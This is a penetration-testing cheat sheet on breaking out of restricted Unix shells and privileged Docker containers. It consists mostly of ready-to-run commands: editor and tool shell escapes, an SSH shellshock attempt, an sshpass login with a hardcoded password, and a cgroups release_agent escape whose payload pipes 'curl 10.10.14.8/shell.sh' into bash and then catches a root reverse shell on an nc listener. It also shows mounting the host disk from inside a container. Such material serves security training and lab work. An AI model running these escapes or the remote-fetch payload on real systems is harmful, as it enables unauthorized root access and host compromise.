# Escaping Restricted Shells

## Breaking Out Of The Jail

_You can execute built-in shell commands, as well as the ones in your $PATH_

## Unix/Linux

### Enumerate

Get environment variables:&#x20;

```
env
printenv
```

Any programs a different user:&#x20;

```
sudo -l
```

Check current PATH:&#x20;

```
echo $PATH
```

List contents of PATH:

```
ls path/to/PATH
echo path/to/PATH/*
```

List the current working directory (if possible):

```
ls
```

List export variables:&#x20;

```
export -p
```

**Research each executable command, look for odd parameters:**

* man pages
* [GTFOBin](https://gtfobins.github.io) (the Shell tag is useful)
* Vulnerabilities in the command

### Writable PATH

* If PATH is writable, game on!
  * `export PATH=/usr/local/bin:/usr/bin:/bin:$PATH`

### Text Editors

* vi, vim, man, less, more

```
:set shell=/bin/bash
:shell
# or
:!/bin/bash
```

#### nano

```
# Control - R, Control - X
^R^X
reset; sh 1>&0 2>&0
```

#### ed&#x20;

`!'/bin/sh'`

### Common Tools

```
# cp
cp /bin/sh /current/PATH
# ftp
ftp
ftp>!/bin/sh
# gdb
gdb
(gdb)!/bin/sh
# awk
awk 'BEGIN {system("/bin/bash")}'
# find
find / -name bleh -exec /bin/bash \;
# expect
expect
spawn sh
```

### SSH

```
# exec commands before remote shell are loaded
ssh test@victim -t "/bin/sh"
# start ssh without loading any profile
ssh test@victim -t "bash --noprofile"
# try shellshock
ssh test@victim -t "() { :; }; /bin/bash"
# try with sshpass
sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash
```

### Scripting Languages

```
# python
python -c 'import os;os.system("/bin/bash")'
# perl
perl -e 'exec "/bin/sh";'
# ruby
ruby -e 'exec /bin/sh'
```

### Writing To a File

```
echo "hello world!" | tee hello.sh
echo "append to the same file" | tee -a hello.sh
```

#### Resources

[SANS](https://www.sans.org/blog/escaping-restricted-linux-shells/) [Hacking Articles](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/) [Escape From SHELLcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)

### rbash (Restricted Bash) Escape

The most simple scenario in which we can escape rbash can be the following.

Let's startup by creating a user with a rbash shell:

```
root@ubuntu:/home# pwd
/home
root@ubuntu:/home# mkdir ruser
root@ubuntu:/home# useradd ruser -d /home/ruser -s /bin/rbash
root@ubuntu:/home# passwd ruser
New password: 
Retype new password: 
passwd: password updated successfully
root@ubuntu:/home# chown ruser:ruser /home/ruser
```

Next, we should inspect the SHELL environment variable, and we should see rbash:

```
root@ubuntu:/home# su ruser
ruser@ubuntu:/home$ id
uid=1001(ruser) gid=1001(ruser) groups=1001(ruser)
ruser@ubuntu:/home$ export | grep SHELL
declare -rx SHELL="/bin/rbash"
```

We can see that the user is using restricted bash (rbash). Which restricts some commands and movement:

```
ruser@ubuntu:/home$ pwd
/home
ruser@ubuntu:/home$ cd
rbash: cd: restricted
ruser@ubuntu:/home$ cd ..
rbash: cd: restricted
ruser@ubuntu:/home$ cd /
rbash: cd: restricted
ruser@ubuntu:/home$ cat
^C
ruser@ubuntu:/home$ touch file
touch: cannot touch 'file': Permission denied
ruser@ubuntu:/home$ makedir folder
rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
ruser@ubuntu:/home$ 
```

However, this can be easily bypassed by simply executing bash (yes, literally):

```
ruser@ubuntu:/home$ bash
ruser@ubuntu:/home$ cd ..
ruser@ubuntu:/$ pwd
/
ruser@ubuntu:/tmp$ cd /tmp
ruser@ubuntu:/tmp$ pwd
/tmp
ruser@ubuntu:/tmp$ touch test
ruser@ubuntu:/tmp$ ls test
test
```

As we can see above, I was able to move around.

We can change the user shell with:

```
echo <password> | su -c 'usermod -s /bin/bash <username>'
```

### cgroups Escape

[This post](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) has a nice POC that works to execute a command on the host from a privileged container. It runs `ps`, but we can modify that to run the same reverse shell from earlier:

```
root@gitlab:~# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
root@gitlab:~# mkdir -p $d/w;echo 1 >$d/w/notify_on_release
root@gitlab:~# t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@gitlab:~# echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl 10.10.14.8/shell.sh | bash' >/c;
root@gitlab:~# chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
```

On running the last command, We can get a request for `shell.sh` at a webserver, and then a shell at a listening `nc`:

```
username@hostname$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.220] 51066
id                                                  
uid=0(root) gid=0(root) groups=0(root)
```

### File System Escape

Instead of running commands, We could also mount the host filesystem. `lsblk` shows the devices, and `sda2` looks like the main disk:

```
root@gitlab:/# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop1    7:1    0 71.3M  1 loop 
loop4    7:4    0 31.1M  1 loop 
loop2    7:2    0 55.5M  1 loop 
loop0    7:0    0 55.4M  1 loop 
sda      8:0    0   20G  0 disk 
|-sda2   8:2    0   18G  0 part /var/log/gitlab
|-sda3   8:3    0    2G  0 part [SWAP]
`-sda1   8:1    0    1M  0 part 
loop5    7:5    0 31.1M  1 loop 
loop3    7:3    0 71.4M  1 loop
```

We can mount it, and now we can have access to the host filesystem:

```
root@gitlab:/# mount /dev/sda2 /mnt 
root@gitlab:/# ls /mnt/
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
```

## References

* [http://netsec.ws/?p=337](http://netsec.ws/?p=337)
* [https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)
* [https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)
* [http://airnesstheman.blogspot.ca/2011/05/breaking-out-of-jail-restricted-shell.html](http://airnesstheman.blogspot.ca/2011/05/breaking-out-of-jail-restricted-shell.html)
* [http://securebean.blogspot.ca/2014/05/escaping-restricted-shell\_3.html](http://securebean.blogspot.ca/2014/05/escaping-restricted-shell\_3.html)
